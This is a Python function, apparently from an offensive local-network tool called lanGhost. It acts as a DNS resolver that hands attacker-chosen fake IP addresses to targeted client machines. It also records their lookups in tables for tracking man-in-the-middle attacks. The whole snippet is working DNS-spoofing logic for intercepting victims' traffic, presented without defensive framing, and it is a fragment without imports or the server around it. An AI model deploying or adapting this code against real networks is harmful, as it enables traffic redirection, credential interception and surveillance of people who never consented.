```python
def getIP(domain_name, client_address):
    try:
        dataip = socket.gethostbyname_ex(domain_name)
        ip = str(dataip[2][0]).strip("[] '")
    except socket.gaierror:
        ip = "0.0.0.0"

    script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
    DBconn = sqlite3.connect(script_path + "lanGhost.db")
    DBcursor = DBconn.cursor()
    DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
    DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_dns (attackid TEXT, target TEXT, domain TEXT, fakeip TEXT)")
    DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
    DBconn.commit()
    DBconn.close()

    DBconn = sqlite3.connect(script_path + "lanGhost.db")
    DBcursor = DBconn.cursor()
    DBcursor.execute("SELECT domain, fakeip FROM lanGhost_dns WHERE target = ?", [str(client_address[0])])
    data = DBcursor.fetchall()
    if not data == []:
        if domain_name == data[0][0]:
            ip = data[0][1]

    DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=? AND attack_type='mitm' ORDER BY id DESC LIMIT 1", [str(client_address[0])])
    data = DBcursor.fetchone()
    if not data == None:
        DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(client_address[0]), domain_name, "false", False, ip, "1"])
        DBconn.commit()
    DBconn.close()
    print("[+] Resolving " + domain_name + " to " + ip + " from " + str(client_address[0]))
    return ip
```